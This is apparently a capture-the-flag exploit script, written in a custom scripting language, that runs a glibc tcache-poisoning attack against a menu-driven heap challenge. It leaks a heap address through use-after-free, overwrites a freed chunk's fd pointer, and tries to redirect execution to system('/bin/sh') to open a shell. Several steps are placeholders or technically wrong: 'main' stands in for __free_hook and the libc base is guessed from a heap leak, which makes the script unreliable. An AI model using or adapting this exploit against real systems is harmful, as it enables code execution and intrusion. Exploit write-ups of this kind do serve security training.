# Tcache poisoning attack for heap exploitation
# Common in modern heap challenges with glibc 2.27+

let binary = "./heap_vuln"
let host = "pwn.chal.ctf"
let port = 9999

print("[*] Tcache Poisoning Exploit")
print("[*] Target:", host, ":", port)

let conn = connect(host, port)

# Menu-driven heap challenge functions
define function alloc(size, data) {
    send(conn, "1")
    let size_str = str(size)
    send(conn, size_str)
    send(conn, data)
}

define function free_chunk(idx) {
    send(conn, "2")
    let idx_str = str(idx)
    send(conn, idx_str)
}

define function view(idx) {
    send(conn, "3")
    let idx_str = str(idx)
    send(conn, idx_str)
    return recv_until(conn, "\n")
}

# Step 1: Allocate chunks to fill tcache
print("[+] Step 1: Filling tcache...")
# Using individual allocations to avoid stack overflow from loop
alloc(0x80, "CHUNK_0")
alloc(0x80, "CHUNK_1")
alloc(0x80, "CHUNK_2")
alloc(0x80, "CHUNK_3")
alloc(0x80, "CHUNK_4")
alloc(0x80, "CHUNK_5")
alloc(0x80, "CHUNK_6")

# Step 2: Free chunks to populate tcache
print("[+] Step 2: Populating tcache bins...")
# Free chunks manually to avoid stack overflow
send(conn, "2")
send(conn, "0")
send(conn, "2")
send(conn, "1")
send(conn, "2")
send(conn, "2")
send(conn, "2")
send(conn, "3")
send(conn, "2")
send(conn, "4")
send(conn, "2")
send(conn, "5")
send(conn, "2")
send(conn, "6")

# Step 3: Leak heap address via UAF
print("[+] Step 3: Leaking heap address...")
# Inline view call to avoid stack overflow
send(conn, "3")
send(conn, "0")
let leak_data = recv_until(conn, "\n")
let heap_leak = u64(leak_data)
let heap_leak_hex = hex(heap_leak)
print("    Heap leak:", heap_leak_hex)

# Step 4: Tcache poisoning - overwrite fd pointer
print("[+] Step 4: Poisoning tcache fd pointer...")

# Analyze binary to get dynamic target address
let elf = analyze(binary)
let elf_symbols = elf["symbols"]
# Using "main" as target since "target" doesn't exist in demo binary
# In real exploit, this would be __free_hook or __malloc_hook
let target_addr = elf_symbols["main"]

# Allocate chunk, free it, then use UAF to poison fd
alloc(0x80, "VICTIM")
# Free chunk 7 - inline to avoid stack overflow
send(conn, "2")
send(conn, "7")

# Overwrite fd pointer in freed chunk to point to target
# This requires a vulnerability like UAF or overflow
let poison_payload = p64(target_addr)
# Assuming edit function exists (vulnerability)
send(conn, "4")  # Edit menu option
send(conn, "7")
send(conn, poison_payload)

# Step 5: Allocate twice to get chunk at target_addr
print("[+] Step 5: Allocating to arbitrary address...")
alloc(0x80, "FILL")  # First alloc returns normal chunk
alloc(0x80, "/bin/sh\x00")  # Second alloc returns target_addr

# Step 6: Trigger exploitation
# If we wrote to __free_hook, next free() will call our address
print("[+] Step 6: Triggering exploit...")

# Calculate libc addresses dynamically
# Assume heap_leak contains a libc pointer (adjust based on actual leak type)
let libc_template = Libc("ubuntu20.04")
# Note: In real exploit, determine what function was leaked from heap
# For demo purposes, showing dynamic calculation pattern
let libc_base = heap_leak & 0xfffffffffffff000  # Align to page
let libc_resolved = Libc("ubuntu20.04")  # Using template for symbol offsets
let libc_symbols = libc_resolved["symbols"]
let system = libc_symbols["system"]
# Calculate actual system address with libc base
let system_addr = libc_base + system
let payload = p64(system_addr)

send(conn, "4")
send(conn, "8")
send(conn, payload)

# Free chunk with /bin/sh to trigger system("/bin/sh")
# Inline to avoid stack overflow
send(conn, "2")
send(conn, "9")

print("[+] Shell should spawn!")
print("[*] In production mode, interactive() would start a shell session")
# interactive(conn)  # Works in production mode; dry-run completes without interaction
